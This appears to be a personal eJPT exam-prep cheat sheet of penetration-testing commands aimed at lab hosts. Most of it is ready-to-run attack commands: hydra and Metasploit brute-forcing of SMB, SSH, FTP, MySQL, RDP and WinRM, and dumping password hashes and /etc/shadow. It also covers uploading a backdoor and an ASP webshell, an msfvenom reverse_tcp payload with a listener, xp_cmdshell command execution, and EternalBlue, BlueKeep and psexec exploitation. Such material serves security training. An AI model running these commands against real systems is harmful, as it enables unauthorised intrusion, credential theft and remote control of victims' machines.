# eJPT Cheet Sheet

This repo has the cheatsheet that I made during my eJPT exam prep...


#### Find IP address of a website:

```shell
host <url>
```

> If you see two addresses or ip addresses than that means the website is behind some kind of proxy or firewall like the cloud flare.

#### Whois recon:

```shell
whois <url>
```

> The `whois` command retrieves registration details about a domain name, such as the owner, contact information, and the domain's creation and expiration dates.

#### DNS Recon

```shell
dnsrecon -d <domain>
```

> DNS Dumpster can be used to perform the same function.

#### WAF w00f command:

```shell
wafw00f <url> -a
```

> Will tell whether the web application is protected by a firewall or not. And if its is protected by the firewall than what solution is being used.

#### Sublist3r

```shell
sublist3r -d <domain>
```

> Looks for subdomains on different search engines.

#### Google Dorking:

```shell
site:<domain>
```

> This limits all the searches to a particular domain only. Will also show some subdomains of the particular domain used.

```shell
site:<domain> inurl:<keyword> 
site:ine.com inurl:admin
```

> This can be used to search a particular key word within the domain URL.

```shell
site:*.<domain>
```

> This would not show the domain it self but its subdomains.

```shell
site:*.<domain> intitle:<keyword>
```

> This will search subdomains with a particular key word in its tittle.

```shell
site:*.<domain> filetype:<type>
site:*.ine.com filetype:PDF
```

> Searches for PDFs (particular file type) in subdomains.

```shell
intitle:index of 
```

> This basically tracks the directory listing vulnerability.

```shell
cache:<domain>
```

> This basically shows the older version of the website.

```shell
inurl:auth_user_file.txt
```

> This would enlist all the website with the same `.txt` file. Such files can be used for storing user authentication passwords.

```shell
inurl:wp-config.bak
```

> Can be used to find WordPress Backup Config Files. Can contain passwords for MySQL servers.

#### theHarvester:

```shell
theharvester -d <domain> -b google,yahoo,<any-other>
```

> Looks for emails and names on a particular website.

#### Zoon Transfer:

```shell
dnsenum <domain>
```

> dnsenum can be used to perform a DNS Brute-force as well.

```shell
dig axfr @<name-server> <domain>
dig axfr @nsztm1.digi.ninja zonetransfer.me
```

> `axfr` is the switch for zone transfer.

```shell
fierce -dns <domain>
```

> It can also be used for performing a DNS Brute-force.

#### Host Discovery using Nmap:

```Shell
sudo nmap -sn <ip-address>/<sub-net-if-any>
```

> Pings all the IPs with in the sub-net and shows only ones that ping back.

```Shell
sudo netdiscover -i <interface> -r <ip-address>/<sub-net-if-any>
sudo netdicover -i eth0 -r 192.168.3.0/24
```

> `-i` is used for the interface and `-r` is used for the ip-address range. It uses ARP to scan the hots.

#### Nmap scans:

`nmap`...Then remember:
- `-sS`: SYN scan (Stealth scan, faster than TCP connect)
- `-sT`: TCP connect scan (Standard TCP scan)
- `-sU`: UDP scan (Scan for open UDP ports)
- `-sA`: ACK scan (Checks firewall rules filtered or not) 
- `-sP` or `-sn`: Ping scan (Find online hosts)
- `-sV`: Version detection (Identify services/version info)
- `-sC`: Default script scan (Runs default NSE scripts)
- `-O`: OS detection (Guess the operating system)
- `-p`: Port selection (Scan specific ports)
- `-F`: Fast scan (Scans fewer ports for speed)
- `-f` Fragmentation 
- `-A`: Aggressive scan (OS detection, version detection, script scanning, and traceroute)
- `-D` Decoy.
- `-T<0-5>`: Timing template (Adjusts scan speed, from `0` (paranoid) to `5` (insane))
- `-oN`: Output in normal format (Saves scan output to a file)
- `-oX`: Output in XML format (Saves scan output in XML format)
- `-oG`: Greppable output (Saves scan output in a grep-friendly format)
- `-oA`: Output in all formats (`-oN`, `-oX`, `-oG` combined)
- `-v`: Verbose mode (Displays more information during the scan)
- `-n`: No DNS resolution (Skips DNS resolution)
- `-6`: IPv6 scanning (Scan using IPv6 addresses)
- `-R`: Always resolve DNS (Resolves domain names, even if not needed)
- `-Pn`: No ping (Skips host discovery, assumes hosts are up)
- `-PS` SYN ping.
- `-iL`: Input from a file (Scans hosts listed in a file)
- `-oX -`: Output to stdout in XML format (Useful for piping into other tools)
- `--host-timeout <time>`: Host is skipped if it doesn't responds in the set time periord.
- `--script`: Run specific NSE scripts (For customized scans)
- `--traceroute`: Perform a traceroute (Maps the route to the host)
- `--reason`: Display the reason for each host/port state
- `--osscan-guess`: OS Version probability.

Example:
```bash
nmap -sS -p 1-100,443 192.168.1.13,14
```

Tip: Use `--reason` to show the explanation of why a port is marked open or closed  
Tip: Use `--open` to show only open, open filtered, and unfiltered ports.

```console
nmap -T4 -sS -sV --version-intensity 8 <ip-address>
```

> In Nmap, the `--version-intensity` option controls the intensity of version detection scanning. It takes a value from 0 to 9, where:
   **0**: Lightest intensity, meaning Nmap will try very few probes to determine the service version.
   **9**: The highest intensity, meaning Nmap will use the most comprehensive set of probes to determine the service version.

```bash
nmap -sV -sC 192.168.1.1
```

>TCP Quick Scan

```bash
nmap -sV -sC -p- 192.168.1.1
```

> TCP Full Scan

```bash
nmap -sV -sU 192.168.1.1
```

> UDP Quick Scan

```bash
nmap -sC -p 27017 192.168.1.13 | less
```

> Get info on a particular service:

NMAP Scripts are all available `/usr/share/namp/scripts`.

```Shell
nmap --script=<script-name> <ip-address>
```

> Basic command to run any script.

```Shell
nmap --script=<keyword-*> <ip-address>
nmap --script=ftp-* 10.10.10.10
```

> It is used to run all the scripts related to any keyword.

```Shell
nmap --mtu <size> <target>
nmap --mtu 32 example.com
```

> The `--mtu` flag allows you to set a custom Maximum Transmission Unit (MTU) for the packets that Nmap sends during scanning.

```Shell
nmap demo.ine.local -p 177 -A
```

> We can perform an Nmap port scan on the target system to identify whether the BIND DNS server is open. 

```Shell
nmap 10.0.24.0/20 --open
```

> This command scans the subnet and shows only the open ports of the target.

```Shell
nmap -p 443 --script ssl-heartbleed <ip-address>
```

> This checks that whether the host machine is vulnerable to Heat Bleed Vulnerability or not.

```Shell
nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:1389 -p 8080 <ip-address>
```

> Log4J Discovery script.
#### TCP Commands:

```Shell
netstat -antp        /linux
netstat -ano         /windows
```

> Lists down all the current tcp connections.

#### SMB Commands:

```Shell
nmap -p445 --script smb-protocols demo.ine.local
```

```Shell
nmap -p445 --script smb-security-mode demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-sessions demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-shares demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```CMD
net use Z: \\<ip-address>\C$ smbserver_771 /user:administrator
```

> To mount the SMD user from the CMD.

```Shell
smbmap -u administrator -p smbserver_771 -d . -H demo.ine.local
```

```Shell
smbmap -H demo.ine.local -u administrator -p smbserver_771 -x 'ipconfig'
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' -L
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' -r 'C$'
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' -r 'C$'
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
```

```msfconsole
/auxiliary/scanner/smb/smb_version
```

> This MSF Module can be used to scan the SAMBA or SMB version of a machine

```msfconsole
/auxiliary/scanner/smb/smb_version
```

> This module is used to check whether it supports SMB2 or not.

```msfconsole
/auxiliary/scanner/smb/smb_enumshares
```

> It can used to enumerate shares.

```msfconsole
/auxiliary/scanner/smb/pipe_auditor
```

> This is used to enumerate name pipes or the communications pipes. 

```Shell
nmblookup -A <ip-address>
```

> This can be used to look up SMB connections and Groups.

```shell
smbclient -L <ip-address> -N
```

> Now SMB Client can be used to connect to those sessions and the `-N` Flag looks for the Null sessions.

```Shell
smbclient //<>ip-address>/<user> -N
```

> This allows us to connect to a particular user without any password.

```Shell
rpcclient -U "" -N <ip-address>
```

> RPC Client is used to connect to a server and in this command it is connected with a null user and no password.

`srvinfo`: This rpc command is used to find the server info.
`enumdomusers`: This rpc commands is used to find users in the server.
`lookupnames <keyword>`: It is used to look for a specific username.
`enumdomgroups`: It is used list down all the groups.

```Shell
enum4linux -o <ip-address>
enum4linux -U <ip-address>
enum4linux -U <ip-address>
enum4linux -G <ip-address>
```

> enum4linux in a Linux enum tool and in the above given command we are doing an operating system scan, second one is performing a user scan, the third one is looking for shares, and the last one lists all the user groups.

```msfconsole
use /auciliary/scanner/smb/smb_login
show options
set RHOST <ip-address>
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set smb_user <user-name>
exploit
```

> These set of commands from metasploit can be used to brute force a particular SMB user.

```Shell
hydra -l <user-name> -P /usr/share/wordlists/rockyou.txt <ip-address> smb
```

> This hydra command is used brute force a particular SMB user.


#### FTP Commands:

```Shell
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip-address> ftp
```

> It is used to brute force users and their passwords on FTP.

```console
ftp <ip-address>
```

> Can be used to login.

```shell
nmap <ip-address> --script-args userdb=/root/users -p 21 
```

**Note:**

`root/users` has the user(s) that I am sure are present in the system.

> Nmap can be also used to brute force user(s) password(s).

#### SSH Commands:

```Shell
 ssh <user-name>@<ip-address> 
```

> SSH Login

```Shell
nmap --script ssh2-enum-algos demo.ine.local
```

> The script enumerates the supported key exchange, encryption, MAC, and compression algorithms for SSH-2 on the target host.

```Shell
nmap --script ssh-hostkey --script-args ssh hostkey=full demo.ine.local
```

>The script retrieves and displays the full SSH host keys and fingerprints of the target server for security auditing purposes.

```Shell
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<user-name>" demo.ine.local
```

> The script checks and lists the supported SSH authentication methods (e.g., password, public key) for the specified user on the target host.

```Shell
hydra -l <uer-name> -P /usr/share/wordlists/rockyou.txt
```

> SSH Brute force using hydra on a specific user.

```Shell
nmap <ip-address> -p 22 --script ssh-brute --script-args userdb=/root/user
```

**Note:**

`root/users` has the user(s) that I am sure are present in the system.

> Nmap can be also used to brute force user(s) password(s).

```msfconsole
use /auciliary/scanner/ssh/ssh_login
show options
set RHOST <ip-address>
set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
set STOP ON SUCCESS true
set verbose true
exploit
```

> These set of commands from metasploit can be used to brute force a particular SSH user.

#### HTTP Commands:

```Shell
whatweb <ip-address>
```

> Running what web tool to find all possible information about the target server.

```Shell
http <ip-address>
```

> We could also use the `httpie` tool to gather target server information.

```Shell
dirp http://<ip-address>
```

> Running the `dirb` tool on the target server port 80 to discover the web server’s directories and subdirectories.

```Shell
browsh --startup-url http://<ip-address>/<sub-domain>
```

> This utility is useful when we don’t have a browser i.e. Firefox, Chrome, etc. to access the target application and we have to use the terminal to access the web application.

```Shell
nmap --script http-enum -sV -p 80 <ip-address>
```

> The command scans port 80 using Nmap to identify HTTP service versions and enumerate potential web directories and files.

```Shell
nmap --script http-headers -sV -p 80 <ip-address>
```

> The command scans port 80 using Nmap to detect service versions `-sV` and retrieve HTTP headers using the `http-headers` script

```Shell
nmap --script http-methods --script-args http-methods.url-path=/webdav/ <ip-address>
```

> The command uses Nmap to scan and check which HTTP methods are allowed on the `/webdav/` URL path by using the `http-methods` script with the specified script arguments.

```Shell
nmap --script http-webdav-scan --script-args http-methods.url-path=/webdav/ demo.ine.local
```

> The command uses Nmap to scan for WebDAV vulnerabilities by checking the `/webdav/` URL path using the `http-webdav-scan` script, with the path specified via script arguments.

```msfconsole
use auxiliary/scanner/http/http_version
show options
set RHOST <ip-address>
run
```

> This can be used to scan an Apache server.

```msfconsole
use auxiliary/scanner/http/brute_dirs
show options
set RHOST <ip-address>
run
```

> This can be used to find sub domains

```msfconsole
use auxiliary/scanner/http/robot_txt
show options
set RHOST <ip-address>
run
```

> Will show the data of `robot.txt`

```Shell
curl http://demo.ine.local/
```

> The `curl http://demo.ine.local/` command sends an HTTP GET request to the specified URL (`http://demo.ine.local/`) and returns the response from the server, which typically includes the HTML content of the webpage.

```Shell
lynx http://demo.ine.local
```

> The `lynx http://demo.ine.local` command uses the Lynx web browser, a text-based browser, to access and display the content of the specified URL (`http://demo.ine.local`) in the terminal.

```Shell
dirb http://<ip-address> /usr/share/metasploit-framework/data/wordlists/directory.txt
```

> The command runs `dirb`, a web content scanner, against the specified IP address using a wordlist from Metasploit (`directory.txt`) to discover hidden directories and files on the target web server.

#### MYSQL Commands:

```Shell
mysql -h <ip-address> -u root
```

> This command can be used to connect to `mysql` through a particular user without any specific password: 

`show databases;`: This command is used to show data bases.
`use <name>;`: This command is used to use a specific data base.
`show tables;`: This command can be used to show the elements of Database. 

```sql
SELECT * FROM table_name;
```

>This command retrieves all the data from a specific table.

```msfconsole
msfconsole -q
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS <ip-address>
set USERNAME root
set PASSWORD ""
exploit
```

> Dump the schema of all databases from the server using metasploit module.

```msfconsole
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST /usr/share/metasploit framework/data/wordlists/directory.txt
set RHOSTS <ip-address>
set VERBOSE false
set PASSWORD ""
exploit
```

> Tells if there are any writeable directories or not.

```msfconsole
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS <ip-address>
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""
exploit
```

> Tells about any readable files.

```SQL
select load_file("/etc/shadow");
```

> This command reads the contents of the system's `/etc/shadow` file, which stores encrypted password information for Linux user accounts.

```msfconsole
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS <ip-address>
set USERNAME root
set PASSWORD ""
exploit
```

> This is used to list all the users and their passwords hashes.

```Shell
nmap --script=mysql-info -p 3306 <ip-address>
```

> The command retrieves basic information about the MySQL service running on port 3306 of the target host, including the MySQL version, protocol version, and server status.

```Shell
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 <ip-address>
```

> The command attempts to enumerate MySQL user accounts by connecting to the MySQL service on port 3306 of the target host using the provided credentials.

```Shell
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 <ip-address>
```

> The command attempts to list all the MySQL databases on the target host by connecting to the MySQL service running on port 3306 using the provided credentials.

```Shell
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 <ip-address>
```

> The command retrieves and displays MySQL server variables and settings by connecting to the MySQL service on port 3306 of the target host using the provided credentials. These variables include configuration options, server status, and environment settings.

```Shell
nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 <ip-address>
```

> The command audits the MySQL server's security settings on port 3306 of the target host by comparing them against a predefined benchmark using the provided credentials.

```Shell
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 <ip-address>
```

> The command attempts to dump MySQL password hashes from the server on port 3306 using the provided credentials (`root` with an empty password).

```Shell
nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 <ip-address>
```

> The command executes the SQL query `SELECT COUNT(*) FROM books.authors;` on the MySQL server at `demo.ine.local` using the provided credentials (`root` with an empty password).

```msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <ip-address>
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true
exploit
```

> Password brute forcing using metasploit

```Shell
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip-address> mysql
```

> Brute force using hydra.

```Shell
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <ip-address>
```

> The command retrieves NTLM authentication information from the Microsoft SQL Server instance running on port 1433 of the target IP.

```Shell
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Deskt p/wordlist/100-common-p asswords.txt <ip-address>
```

> Brute Force using NMAP.\

```Shell
nmap -p 1433 --script ms-sql-empty-password <ip-address>
```

> Login through empty password.

```Shell
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" <ip-address> -oN output.txt gvim output.txt
```

> The command runs a SQL query (`SELECT * FROM master..syslogins`) on the Microsoft SQL Server instance using the `admin` credentials with password `anamaria`, saves the output to `output.txt`, and then opens this file in `gvim`.

```Shell
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria <ip-address>
```

> The command retrieves password hashes from the Microsoft SQL Server using the provided `admin` credentials with password `anamaria`.

```Shell
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" <ip-address>
```

> The command executes the `ipconfig` command on the Microsoft SQL Server at `<ip-address>` using the `admin` credentials with password `anamaria` and the `xp_cmdshell` stored procedure.

```Shell
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <ip-address>
```

> The command runs `type c:\flag.txt` on the Microsoft SQL Server at using the `admin` credentials with password `anamaria`, which attempts to read and display the contents of `c:\flag.txt` via the `xp_cmdshell` procedure.

```msfconsole
use auxiliary/scanner/mssql/mssql_login 
set RHOSTS <ip-address> 
set USER_FILE /root/Desktop/wordlist/common_users.txt 
set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt 
set VERBOSE false exploit
```

> MSSQL brute force using metasploit.

```msfconsole
use auxiliary/admin/mssql/mssql_enum 
set RHOSTS <ip-address>
exploit
```

> Running MSSQL enumeration module to find all possible information.

```msfconsole
use auxiliary/admin/mssql/mssql_enum_sql_logins 
set RHOSTS <ip-address> 
exploit
```

> Extract all MSSQL users.

```msfconsole
use auxiliary/admin/mssql/mssql_exec 
set RHOSTS <ip-address>
set CMD whoami 
exploit
```

> Execute a command using `mssql_exec` module.

```msfconsole
use auxiliary/admin/mssql/mssql_enum_domain_accounts 
set RHOSTS <ip-address> 
exploit
```

> This module dumps the information such as Windows domain users, groups, and computer accounts

#### Exploiting Microsoft IIA WebDAV:

```Shell
hydra -L /usr/share/metasploit/common_user.txt -P /usr/share/metasploit/common_passwords.txt <ip-address> http-get /webdav/
```

> Hydra can be used to brute force `webdav` directory if the authentication is enabled.

```Shell
davtest -url http://<ip-address>/webdav
```

> Can be used to test if `webdav` is present or is accessible without authentication. If it isn't then it will show an error.

```Shell
davtest -auth <user-name>:<password> -url http://<ip-address>/webdav
```

> This will perform a check and will tell what type of files can be uploaded or executed over the server.

```
cadaver http://<ip-address>/webdav
```

> Cadaver can be used to upload files on the server and when you will type this command you will be than asked for a username and a password. After the correct creds. you will get the access to a pseudo shell through which you will be able to interact with the server. 

```Shell
put /usr/share/webshells/asp/webshell.asp
```

> This command can be used in the pseudo shell to upload the web shell on to the server.

```Shell
/usr/share/webshells
```

> This directory has different web shells with in Kali Linux.

```Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=1234 -f asp > <output-file-name>.asp
```

> `msfvenom` command to generate a `.asp` shell code.

```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set LHOTS <local_ip>
set LPORT 1234
exploit
```

> Msfconsole listener setup.

```msfconsole
use exploit/windows/iis/iis_webdav_upload_asp
show options
set HttpUsername <username>
set HttpPassword <password>
set RHOST <ip-address>
set PATH /webdav/metasploit.asp
exploit
```

> This can be used to automate the whole process of uploading and exploitation.

#### SMB Exploitation:

```msfconsole
use auxiliary/scanner/smb/smb_login
show options
set RHOST <ip-address>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit
```

> This module can be used to brute force users on SMB.

```
psexec.py Administrator@<ip-address> cmd.exe
```

> It will ask for the password after this command.

```msfconsole
use exploit/windows/smb/psexec
show options
set RHOST <ip-address>
set SMBUser <username>
set SMBPass <password>
exploit
```

> If you know the user and pass then it will automates the uploading and exploitation phase and gives you a meterpreter shell.

#### Exploiting MS17-010

```Shell
nmap -sV -p 445 --script=smb-vuln-ms17-10 <ip-address>
```

> Scans the machine for MS17-010 Vulnerability. 

```Shell
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
```

> This tool can be used to exploit the vulnerability manually. 

```msfconsole
use exploit/windows/smb/ms17_010_eternalblue
show options
set LHOST <host-address>
set RHOST <ip-address>
exploit
```

#### RDP Exploitation:

```msfconsole
search auxiliary/scanner/rdp/rdp_scanner
show options
set RHOST <ip-address>
set RPORT <port-number>
run
```

> This will tell whether a specific port is running RDP or not.

```Shell
hydra -L /usr/share/metasploit/common_user.txt -P /usr/share/metasploit/unix_passwords.txt rdp://<ip-address> -s 3333
```

> Command to brute force RDP.

```Shell
xfreerdp /u:administrator /p:<password> /v:<ip-address>:3333
```

> Command can be used to connect to RDP.

#### Exploit Blue Keep:

```msfconsole
use auxiliara/scanner/rdp/cve_2019_0708_bluekeep
show options
set RHOST <ip-address>
run
```

> It is a Blue Keep Vulnerability scanner.

```msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show options
set RHOST <ip-address>
show target 
set target <target-number>
exploit
```

> Module can be used to exploit the vulnerability and then get access. 

#### Exploiting WinRM:

```Shell
crackmapexec winrm <ip-address> -u administrator -p /usr/share/metasploit/unix_passwords.txt
```

> WinRM brute force command using `crackmapexec`.

```Shell
crackmapexec winrm <ip-address> -u administrator -p <password>
```

> This command can be used to execute arbitrary command on the windows machine.

```Shell
eveil-winrm.rb -u administrator -p '<password>' -i <ip-address>
```

> This will automatically provide us a command shell session.

```msfconsole
use exploit/windows/winrm/winrm_script_exec
show options
set RHOST <ip-address>
set FORCE_VBS true
set USERNAME administrator
set PASSWORD <password>
exploit
```

> This will provide us with a shell session as well.

```msfconsole
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
```

> Can be used to brute force the creds.

```msfconsole
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit
```

> Checking WinRM supported authentication method using an auxiliary module.

```msfconsole
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit
```

> Can be used to execute remote commands.



